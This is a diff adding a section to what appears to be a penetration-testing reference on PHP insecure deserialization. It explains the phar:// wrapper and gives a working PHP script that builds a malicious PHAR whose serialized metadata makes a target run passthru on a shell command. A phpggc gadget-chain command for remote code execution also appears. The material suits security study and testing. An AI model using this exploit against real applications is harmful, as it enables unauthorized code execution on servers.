@@ -16,8 +16,8 @@ Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.c
 * [Authentication bypass](#authentication-bypass)
 * [Finding and using gadgets](#finding-and-using-gadgets)
 * [Real world examples](#real-world-examples)
+* [PHP Phar Deserialization](#php-phar-deserialization)
 * [References](#references)
-
 
 ## General concept
 
@@ -129,6 +129,50 @@ Also called "PHP POP Chains", they can be used to gain RCE on the system.
 phpggc monolog/rce1 'phpinfo();' -s
 ```
 
+## PHP Phar Deserialization
+
+Using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.
+
+A valid PHAR includes four elements:
+
+1. Stub
+2. Manifest
+3. File Contents
+4. Signature
+
+Example of a Phar creation in order to exploit a custom `PDFGenerator`.
+
+```php
+<?php
+class PDFGenerator { }
+
+//Create a new instance of the Dummy class and modify its property
+$dummy = new PDFGenerator();
+$dummy->callback = "passthru";
+$dummy->fileName = "uname -a > pwned"; //our payload
+
+// Delete any existing PHAR archive with that name
+@unlink("poc.phar");
+
+// Create a new archive
+$poc = new Phar("poc.phar");
+
+// Add all write operations to a buffer, without modifying the archive on disk
+$poc->startBuffering();
+
+// Set the stub
+$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
+
+/* Add a new file in the archive with "text" as its content*/
+$poc["file"] = "text";
+// Add the dummy object to the metadata. This will be serialized
+$poc->setMetadata($dummy);
+// Stop buffering and write changes to disk
+$poc->stopBuffering();
+?>
+```
+
+
 ## Real world examples
 
 * [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)
@@ -149,3 +193,4 @@ phpggc monolog/rce1 'phpinfo();' -s
 * [Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec](https://rawsec.ml/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
 * [Rusty Joomla RCE Unserialize overflow](https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41)
 * [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
+* [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
